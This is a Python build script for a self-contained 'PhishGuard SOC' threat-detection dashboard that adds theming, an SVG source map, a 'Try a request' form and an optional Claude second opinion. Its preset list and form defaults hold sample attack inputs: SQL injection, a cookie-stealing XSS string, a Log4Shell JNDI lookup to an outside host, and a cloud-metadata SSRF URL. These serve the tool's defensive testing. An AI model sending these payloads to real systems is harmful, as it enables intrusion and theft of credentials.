"""Build web/phishguard_soc.html: the Flask dashboard UI + the JS engine, fully self-contained."""
import json, os, re, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
os.environ.setdefault("PHISHGUARD_DATA", "/tmp/build_train.json")
import phishguard_soc as m

H = m.DASHBOARD_HTML
def rep(a, b, count=1):
    global H
    n = H.count(a)
    assert n == count, (n, a[:90])
    H = H.replace(a, b)

# ── head ──
rep('<meta name="viewport" content="width=device-width, initial-scale=1">',
    '<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">')
rep('<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">\n<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>\n', '')

# ── theme tokens (light default, dark via system or viewer setting) ──
LIGHT = """--bg:#f3f5f9; --panel:#ffffff; --panel-2:#f1f4f9; --line:#e2e7ef; --line-2:#cbd3e0;
  --text:#0f172a; --muted:#475569; --faint:#64748b;
  --accent:#0f766e; --accent-ink:#ffffff; --ip:#0369a1; --top-bg:rgba(243,245,249,.9);
  --map-bg:#e8edf4; --land:#cfd8e5; --land-edge:#bcc7d6;
  --t-critical:#be123c; --t-high:#c2410c; --t-medium:#a16207; --t-low:#0369a1; --t-info:#475569; --ok-ink:#047857;
  color-scheme:light;"""
DARK = """--bg:#0a0f1c; --panel:#0f1629; --panel-2:#141d33; --line:#1d2842; --line-2:#2a3858;
  --text:#e3e9f5; --muted:#9aa8c7; --faint:#7b89a8;
  --accent:#2dd4bf; --accent-ink:#04201c; --ip:#7dd3fc; --top-bg:rgba(10,15,28,.86);
  --map-bg:#0b1222; --land:#1a2540; --land-edge:#263457;
  --t-critical:#fda4af; --t-high:#fdba74; --t-medium:#fde047; --t-low:#7dd3fc; --t-info:#cbd5e1; --ok-ink:#6ee7b7;
  color-scheme:dark;"""
rep("""  --bg:#0a0f1c; --panel:#0f1629; --panel-2:#141d33; --line:#1d2842; --line-2:#2a3858;
  --text:#e3e9f5; --muted:#9aa8c7; --faint:#6b7a99;
  --accent:#2dd4bf; --accent-ink:#04201c;
""", "  " + LIGHT + "\n")
rep("  --r:12px;\n}", "  --r:12px;\n}\n@media (prefers-color-scheme:dark){:root:not([data-theme=\"light\"]){" + DARK +
    "}}\n:root[data-theme=\"dark\"]{" + DARK + "}\n"
    ":root{box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}\n"
    "html{scroll-padding-top:env(safe-area-inset-top,0px)}")
rep("html,body{background:var(--bg);", "html,body{background:var(--bg);")
rep("padding:12px 22px;background:rgba(10,15,28,.86);", "padding:12px 22px;background:var(--top-bg);")
rep(".top{position:sticky;top:0;", ".top{position:sticky;top:env(safe-area-inset-top,0px);")
rep(".btn.danger{background:rgba(244,63,94,.12);border-color:rgba(244,63,94,.45);color:#fda4af}",
    ".btn.danger{background:rgba(244,63,94,.12);border-color:rgba(244,63,94,.45);color:var(--t-critical)}")
rep(".ip{font-family:var(--mono);color:#7dd3fc;", ".ip{font-family:var(--mono);color:var(--ip);")
for sev, old in (("critical", "#fecdd3"), ("high", "#fed7aa"), ("medium", "#fef08a"), ("low", "#bae6fd"), ("info", "#cbd5e1")):
    rep(f"{{color:{old};", f"{{color:var(--t-{sev});")
rep(".etag.BBB{background:rgba(244,63,94,.16);color:#fda4af}.etag.JOB{background:rgba(251,146,60,.16);color:#fed7aa}",
    ".etag.BBB{background:rgba(244,63,94,.14);color:var(--t-critical)}.etag.JOB{background:rgba(251,146,60,.16);color:var(--t-high)}")
rep(".etag.SPAM{background:rgba(148,163,184,.16);color:#cbd5e1}.etag.PHISH{background:rgba(250,204,21,.14);color:#fef08a}",
    ".etag.SPAM{background:rgba(148,163,184,.18);color:var(--t-info)}.etag.PHISH{background:rgba(250,204,21,.18);color:var(--t-medium)}")
rep(".etag.SAFE{background:rgba(52,211,153,.14);color:#a7f3d0}", ".etag.SAFE{background:rgba(52,211,153,.16);color:var(--ok-ink)}")
rep(".bbb-box b{color:#fda4af}", ".bbb-box b{color:var(--t-critical)}")
rep(".btn.ok{background:rgba(52,211,153,.12);border-color:rgba(52,211,153,.45);color:#a7f3d0}",
    ".btn.ok{background:rgba(52,211,153,.12);border-color:rgba(52,211,153,.45);color:var(--ok-ink)}")
rep('<span style="color:#fda4af">⛔ blocked</span>', '<span style="color:var(--t-critical)">⛔ blocked</span>')
# map styles: replace Leaflet rules with SVG map rules
H = re.sub(r"#map\{height:330px;background:#0b1222\}\n(?:\.leaflet[^\n]*\n)+",
           "#map{height:330px;background:var(--map-bg);position:relative;overflow:hidden}\n"
           "#map svg{width:100%;height:100%;display:block}\n"
           ".land{fill:var(--land);stroke:var(--land-edge);stroke-width:.6;vector-effect:non-scaling-stroke}\n"
           ".dot{cursor:pointer;fill-opacity:.55;stroke-width:1.5;vector-effect:non-scaling-stroke;transition:r .3s}\n"
           ".dot:focus-visible{outline:none;stroke:var(--text);stroke-width:3}\n"
           ".map-tip{position:absolute;z-index:5;max-width:240px;background:var(--panel-2);border:1px solid var(--line-2);border-radius:8px;"
           "padding:8px 10px;font-size:12px;box-shadow:0 8px 24px rgba(0,0,0,.25);pointer-events:none}\n"
           ".map-note{position:absolute;left:12px;bottom:10px;font-size:11px;color:var(--faint)}\n", H, count=1)
assert "leaflet" not in H.split("<body>")[0], "leaflet css left"
rep(".drawer{position:fixed;top:0;right:0;height:100vh;height:100dvh;",
    ".drawer{position:fixed;top:0;right:0;height:100vh;height:100dvh;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);")
rep(".toasts{position:fixed;bottom:18px;", ".toasts{position:fixed;bottom:calc(18px + env(safe-area-inset-bottom,0px));")
rep("@media (max-width:1280px)", """.try-f{padding:12px 16px 14px;display:flex;flex-direction:column;gap:10px}
.try-f .fld input,.try-f .fld textarea,.try-f select{background:var(--bg);border:1px solid var(--line-2);border-radius:8px;color:var(--text);
  padding:7px 10px;font-family:var(--mono);font-size:12px;width:100%}
.try-f select{font-family:var(--sans)}
.try-f details summary{cursor:pointer;font-size:12px;color:var(--muted)}
.try-f details[open] summary{margin-bottom:8px}
.try-g{display:grid;grid-template-columns:110px 1fr;gap:8px}
.presets{display:flex;flex-wrap:wrap;gap:6px}
.kw .dotc{width:8px;height:8px;border-radius:50%;flex-shrink:0}
.note{font-size:12px;color:var(--faint);line-height:1.5}
.ai-ask{margin:0 18px 14px;display:flex;gap:10px;align-items:center;flex-wrap:wrap}
.ai-ask .note{flex:1;min-width:180px}
@media (max-width:1280px)""")

# ── layout: SVG map + "Try a request" card ──
LAND = open(os.path.join(os.path.dirname(__file__), "land_path.txt")).read()
rep('<div id="map"></div>',
    '<div id="map"><svg viewBox="0 14 1000 400" preserveAspectRatio="xMidYMid meet" role="img" aria-label="Map of request sources">'
    f'<path class="land" d="{LAND}"/><g id="map-dots"></g></svg><div class="map-tip" id="map-tip" hidden></div>'
    '<div class="map-note" id="map-note">Sources with a known location appear here.</div></div>')
rep('''    <div class="col">
      <section class="card">
        <div class="card-h"><span class="card-t">Live alerts</span>''', '''    <div class="col">
      <section class="card">
        <div class="card-h"><span class="card-t">Try a request</span><span class="card-sub">runs in your browser</span></div>
        <form class="try-f" id="try-form" autocomplete="off">
          <div class="presets" id="presets"></div>
          <label class="fld"><span>Path and query</span><input id="try-path" value="/login?user=admin' OR '1'='1" spellcheck="false"></label>
          <label class="fld"><span>User-Agent</span><input id="try-ua" value="sqlmap/1.8.4" spellcheck="false"></label>
          <details><summary>More fields</summary>
            <div class="try-g">
              <label class="fld"><span>Method</span><select id="try-method"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>TRACE</option></select></label>
              <label class="fld"><span>Source IP</span><input id="try-ip" value="198.51.100.33" spellcheck="false"></label>
            </div>
            <label class="fld" style="margin-top:8px"><span>Referrer</span><input id="try-ref" spellcheck="false" placeholder="https://…"></label>
            <label class="fld" style="margin-top:8px"><span>Body</span><textarea id="try-body" rows="2" spellcheck="false" placeholder="Form or JSON body (POST/PUT)"></textarea></label>
          </details>
          <div class="pg-actions"><button class="btn primary" type="submit">Analyze request</button></div>
          <p class="note">Nothing is sent anywhere: the same rules as the Python server run inside this page.</p>
        </form>
      </section>
      <section class="card">
        <div class="card-h"><span class="card-t">Live alerts</span>''')

# ── JS: in-page API, SVG map, AI via the viewer, themed colors ──
rep(H[H.index("async function api(path, opts = {}, retried = false) {"):H.index("/* ── map ── */")],
    '''const ENV = {
  persist: s => { try { localStorage.setItem("phishguard.training.v1", s); } catch (e) {} },
  load: () => { try { return localStorage.getItem("phishguard.training.v1"); } catch (e) { return null; } },
  aiAvailable: false,
};
const ENGINE = createEngine(PG_DATA, ENV);
async function api(path, opts = {}) { return ENGINE.api(path, opts); }
let SAMPLE = null;

''')
rep(H[H.index("/* ── map ── */"):H.index("/* ── events ── */")], '''/* ── map (inline SVG, equirectangular) ── */
const SVGNS = "http://www.w3.org/2000/svg";
const proj = (lat, lon) => [(lon + 180) / 360 * 1000, (90 - lat) / 180 * 500];
function initMap() {}
function popupHtml(e, n) {
  return `<b class="mono">${esc(e.ip)}</b><br>${esc(e.city)}${e.country ? ", " + esc(e.country) : ""}<br>${esc(e.org || "")}<br>` +
         `Peak risk <b>${Number(e.risk)}</b> · ${n} event${n === 1 ? "" : "s"}`;
}
function showTip(m) {
  const tip = $("map-tip"), box = $("map").getBoundingClientRect(), r = m.el.getBoundingClientRect();
  tip.innerHTML = popupHtml(m.ev, m.n); tip.hidden = false;
  const x = Math.min(r.left - box.left + 12, box.width - 250), y = Math.max(r.top - box.top - 10 - tip.offsetHeight, 6);
  tip.style.left = Math.max(6, x) + "px"; tip.style.top = y + "px";
}
function upsertMarker(e) {
  if (typeof e.lat !== "number" || typeof e.lon !== "number") return;
  const m = S.markers[e.ip];
  if (m) {
    m.n++;
    if (e.risk > m.risk) { m.risk = e.risk; m.ev = e; m.el.setAttribute("fill", SEV_HEX[e.severity]); m.el.setAttribute("stroke", SEV_HEX[e.severity]); }
    m.el.setAttribute("r", Math.min(6 + m.n * 0.6, 15));
    return;
  }
  const [x, y] = proj(e.lat, e.lon), c = SEV_HEX[e.severity] || SEV_HEX.info;
  const el = document.createElementNS(SVGNS, "circle");
  Object.entries({cx: x, cy: y, r: 6, fill: c, stroke: c, class: "dot", tabindex: "0", role: "button", "aria-label": `Source ${e.ip}`})
    .forEach(([k, v]) => el.setAttribute(k, v));
  const mk = S.markers[e.ip] = {el, risk: e.risk, n: 1, ev: e};
  el.addEventListener("mouseenter", () => showTip(mk)); el.addEventListener("focus", () => showTip(mk));
  el.addEventListener("click", ev => { ev.stopPropagation(); showTip(mk); });
  el.addEventListener("mouseleave", () => $("map-tip").hidden = true); el.addEventListener("blur", () => $("map-tip").hidden = true);
  $("map-dots").appendChild(el);
  $("map-note").hidden = true;
}
document.addEventListener("click", () => { const t = $("map-tip"); if (t) t.hidden = true; });

''')
rep('if (v === "network" && map) setTimeout(() => map.invalidateSize(), 60);\n', '')
rep('<span class="c" style="color:${CAT_HEX[h.cat] || "var(--muted)"}">${esc(label(h.cat))}</span>',
    '<span class="dotc" style="background:${CAT_HEX[h.cat] || "var(--muted)"}"></span><span class="c">${esc(label(h.cat))}</span>')
rep('''$("rules-lbl").textContent = `${st.rules} network rules · PhishGuard ${st.messages && st.messages.ai_enabled ? "+ " + st.messages.ai_providers.join(" & ") : "rules engine"}`;''',
    '''$("rules-lbl").textContent = `${st.rules} network rules · runs in your browser`;''')
rep('${esc(h.kw.replace(/^regex:/, "pattern: "))}', '${esc(ENGINE.kwLabel(h.kw))}')
rep('${esc(h.keyword.replace(/^regex:/, "pattern: "))}', '${esc(ENGINE.kwLabel(h.keyword))}')
# AI opinion colors + gauge/verdict text use theme-aware ink; add "Ask Claude" row
rep('<span class="ai-s" style="color:${SEV_HEX[sevOf(o.score)]}">', '<span class="ai-s" style="color:var(--t-${sevOf(o.score)})">')
rep('<b style="color:${col}">${Number(r.score)}</b>', '<b style="color:var(--t-${r.severity})">${Number(r.score)}</b>')
rep('<div class="verdict" style="color:${col}">', '<div class="verdict" style="color:var(--t-${r.severity})">')
rep('<span class="pts" style="color:${f.points < 0 ? "var(--ok)" : col}">', '<span class="pts" style="color:${f.points < 0 ? "var(--ok-ink)" : "var(--t-" + r.severity + ")"}">')
rep('''    ${aiHtml}
    <div class="pg-sec"><div class="sect">Why</div>''', '''    ${aiHtml}${aiAskHtml(r)}
    <div class="pg-sec"><div class="sect">Why</div>''')
rep('''  const line = ["rules " + r.heuristic_score''', '''  const line = ["rules " + r.heuristic_score''')
rep(''' + (ops.length ? "" : " · AI off");''', ''';''')
rep('''function renderPgStats(s) {''', '''function aiAskHtml(r) {
  if (!SAMPLE || (r.ai || []).some(o => o.provider === "Claude" && o.score != null)) return "";
  return `<div class="ai-ask"><button class="btn" type="button" id="ask-claude" data-ask="${esc(r.id)}">Ask Claude for a second opinion</button>
    <span class="note" id="ask-note">Uses your Claude account. Your confirmed examples are included as context.</span></div>`;
}
async function askClaude(id) {
  const r = PG.scans.find(x => x.id === id) || PG.current; if (!SAMPLE || !r) return;
  const btn = $("ask-claude"), note = $("ask-note");
  btn.disabled = true; btn.textContent = "Thinking…"; note.textContent = "Waiting for Claude…";
  try {
    const out = await SAMPLE.json(ENGINE.aiPrompt(r), {modelTier: "quick"});
    const s = ENGINE.addOpinion(id, out || {});
    if (s) { pgShow(s, false); pgRefresh(); }
  } catch (e) {
    const code = e && e.code;
    if (code === "not_granted" || code === "unavailable") { SAMPLE = null; ENV.aiAvailable = false; if ($("ask-claude")) $("ask-claude").closest(".ai-ask").remove(); pgRefresh(); toast("Claude isn't available in this view", true); return; }
    btn.disabled = false; btn.textContent = "Ask Claude for a second opinion";
    note.textContent = code === "rate_limited" ? "Claude is busy right now. Try again in a minute." : "Couldn't get a second opinion. Try again.";
  }
}
document.addEventListener("click", ev => { const b = ev.target.closest("[data-ask]"); if (b) askClaude(b.dataset.ask); });
function renderPgStats(s) {''')
rep('''`<div class="pg-stat" style="grid-column:1/-1"><span>${s.ai_enabled ? "🤖 AI second opinion: " + esc(s.ai_providers.join(" + ")) + (s.ai_providers.length > 1 ? " (scores averaged)" : "")
      : "AI second opinion is off · set ANTHROPIC_API_KEY and/or GEMINI_API_KEY on the server"}</span></div>`;''',
    '''`<div class="pg-stat" style="grid-column:1/-1"><span>${s.ai_enabled ? "🤖 Claude second opinion available on each result. Your training is saved on this device."
      : "Your training is saved on this device. AI second opinions (Claude and Gemini) are in the Python version."}</span></div>`;''')

# presets + try-a-request handler + boot sequence
PRESETS = [
    ("Normal visit", "GET", "/log?page=/pricing", CH := m.CHROME, "", "192.0.2.88", ""),
    ("SQL injection", "GET", "/login?user=admin' OR '1'='1", "sqlmap/1.8.4", "", "198.51.100.33", ""),
    ("XSS", "GET", "/search?q=<script>alert(document.cookie)</script>", CH, "", "203.0.113.24", ""),
    ("Log4Shell", "GET", "/api/health", "${jndi:ldap://203.0.113.5:1389/a}", "", "198.51.100.71", ""),
    ("WordPress probe", "GET", "/wp-login.php", "Mozilla/5.0 (compatible; Nuclei)", "", "203.0.113.10", ""),
    ("Cloud metadata (SSRF)", "GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", "python-requests/2.32", "", "192.0.2.140", ""),
    ("Scam-domain referrer", "GET", "/billing", CH, "https://harriscollect.payweb360.com/login?consent=true", "203.0.113.57", ""),
]
rep('''setInterval(() => { $("clock").textContent''', '''const PRESETS = ''' + json.dumps(PRESETS).replace("</", "<\\/") + ''';
$("presets").innerHTML = PRESETS.map((p, i) => `<button class="exb" type="button" data-preset="${i}">${esc(p[0])}</button>`).join("");
document.addEventListener("click", ev => {
  const b = ev.target.closest("[data-preset]"); if (!b) return;
  const [, method, path, ua, ref, ip, body] = PRESETS[+b.dataset.preset];
  $("try-method").value = method; $("try-path").value = path; $("try-ua").value = ua; $("try-ref").value = ref; $("try-ip").value = ip; $("try-body").value = body;
});
$("try-form").addEventListener("submit", async ev => {
  ev.preventDefault();
  const full = $("try-path").value.trim() || "/", i = full.indexOf("?");
  const req = {method: $("try-method").value, path: i < 0 ? full : full.slice(0, i) || "/", query: i < 0 ? "" : full.slice(i + 1),
               ua: $("try-ua").value, referrer: $("try-ref").value.trim(), ip: $("try-ip").value.trim() || "198.51.100.33", body: $("try-body").value};
  if (!/^[0-9.]+$|:/.test(req.ip)) { toast("Source IP should look like 198.51.100.33", true); return; }
  const e = await api("/api/analyze", {method: "POST", body: JSON.stringify(req)});
  while (S.inflight) await new Promise(r => setTimeout(r, 20));
  const wasPaused = S.paused; S.paused = false; await poll(); S.paused = wasPaused;
  openEvent(e.id);
  toast(`${e.severity[0].toUpperCase() + e.severity.slice(1)} · risk ${e.risk}/100`);
});

setInterval(() => { $("clock").textContent''')
rep('''poll(); setInterval(poll, 3000);''', '''poll(); setInterval(poll, 2000);
api("/api/demo", {method: "POST"}).catch(() => {});  // start with live-looking traffic
(async () => {
  try {
    const s = window.claude && window.claude.use ? await window.claude.use("sample") : null;
    if (s) { SAMPLE = s; ENV.aiAvailable = true; pgRefresh(); if (PG.current) pgShow(PG.current, false); }
  } catch (e) {}
})();''')

# inline data + engine before the app script
DATA = json.load(open(os.path.join(os.path.dirname(__file__), "engine_data.json")))
ENGINE_JS = open(os.path.join(os.path.dirname(__file__), "engine.js")).read()
blob = json.dumps(DATA, ensure_ascii=False).replace("</", "<\\/")
rep('<script>\n"use strict";', f'<script>const PG_DATA = {blob};</script>\n<script>{ENGINE_JS}</script>\n<script>\n"use strict";')

ext = sorted(set(re.findall(r'(?:src|href)="(https?://[^"]+)"', H)))
assert all(u.startswith("https://fonts.googleapis.com") for u in ext), ext
out = os.path.join(os.path.dirname(__file__), "phishguard_soc.html")
open(out, "w").write(H)
print("built", out, f"{len(H)/1024:.0f} KB; external refs:", ext)
